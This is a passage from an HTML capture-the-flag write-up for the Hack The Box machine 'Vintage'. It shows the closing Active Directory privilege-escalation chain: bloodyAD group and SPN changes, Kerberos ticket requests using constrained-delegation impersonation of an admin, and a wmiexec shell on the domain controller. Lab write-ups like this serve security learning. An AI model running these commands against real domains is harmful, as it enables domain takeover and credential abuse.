+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>add<span class="w"> </span>groupMember<span class="w"> </span><span class="s2">&quot;DELEGATEDADMINS&quot;</span><span class="w"> </span><span class="s2">&quot;SVC_SQL&quot;</span><span class="w">  </span>
+</pre></div>
+</div>
+<p>How is this helpful? Because since the sql service is disabled we can give it constrained access to a fake spn, and <code class="docutils literal notranslate"><span class="pre">svc_sql</span></code> will then be able to impersonate an admin when connecting to that service specifically.</p>
+<p>Give <code class="docutils literal notranslate"><span class="pre">svc_sql</span></code> a fake spn</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodyAD<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--host<span class="w"> </span>dc01.vintage.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;VINTAGE.HTB&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="nb">set</span><span class="w"> </span>object<span class="w"> </span><span class="s2">&quot;SVC_SQL&quot;</span><span class="w"> </span>servicePrincipalName<span class="w"> </span><span class="se">\</span>
+<span class="w">      </span>-v<span class="w"> </span><span class="s2">&quot;cifs/fake&quot;</span><span class="w"> </span>
+</pre></div>
+</div>
+<p>Get a TGT as <code class="docutils literal notranslate"><span class="pre">svc_sql</span></code> again</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getTGT.py<span class="w"> </span>vintage.htb/svc_sql:<span class="s1">&#39;Zer******&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>svc_sql.ccache
+</pre></div>
+</div>
+<p><img alt="bianchi.png" src="../../../../_images/bianchi.png" /></p>
+<p>Get a Service Ticket to that fake spn while impersonating another admin: <code class="docutils literal notranslate"><span class="pre">l.bianchi_adm</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>getST.py<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-spn<span class="w"> </span><span class="s1">&#39;cifs/dc01.vintage.htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-impersonate<span class="w"> </span>l.bianchi_adm<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.11.45<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s1">&#39;vintage.htb/svc_sql:Zer******&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>l.bianchi_adm.ccache
+</pre></div>
+</div>
+<p>And finally we can use that Service Ticket with wmi to get a shell as <code class="docutils literal notranslate"><span class="pre">l.bianchi_admin</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wmiexec.py<span class="w"> </span>vintage.htb/l.bianchi_adm@dc01.vintage.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>
+</pre></div>
+</div>
+<p>That account is a member of the domain admins group, which gives us full admin on the dc.</p>
+<p><img alt="admin.png" src="../../../../_images/admin.png" /></p>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../../medium/medium.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Medium</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../snoopy/snoopy.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Snoopy</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Vintage</a><ul>
+<li><a class="reference internal" href="#initial-enumeration">Initial Enumeration</a></li>
+<li><a class="reference internal" href="#enumeration-ad-ldap">Enumeration AD/LDAP</a></li>
+<li><a class="reference internal" href="#pre-windows-2000-compatible-access">Pre-windows 2000 compatible access</a></li>
+<li><a class="reference internal" href="#fs01-has-readgmsapassword">FS01 has ReadGMSAPassword</a></li>
+<li><a class="reference internal" href="#gmsa-genericwrite-over-servicemanagers">gMSA genericWrite over servicemanagers</a></li>
+<li><a class="reference internal" href="#servicemanagers-genericwrite-over-system-accounts">Servicemanagers genericWrite over system accounts</a></li>
+<li><a class="reference internal" href="#as-rep-roasting">AS-Rep Roasting</a></li>
+<li><a class="reference internal" href="#password-reuse">Password Reuse</a></li>
+<li><a class="reference internal" href="#stealing-and-decrypting-dpapi-secrets">Stealing and Decrypting DPAPI Secrets</a><ul>
+<li><a class="reference internal" href="#stealing-the-encryption-key">Stealing the Encryption Key</a></li>
+<li><a class="reference internal" href="#stealing-encrypted-secrets">Stealing Encrypted Secrets</a></li>
+<li><a class="reference internal" href="#decrypting-the-secrets">Decrypting the secrets</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#c-neri-adm-genericwrite-to-delegatedadmins">C Neri Adm GenericWrite to DelegatedAdmins</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
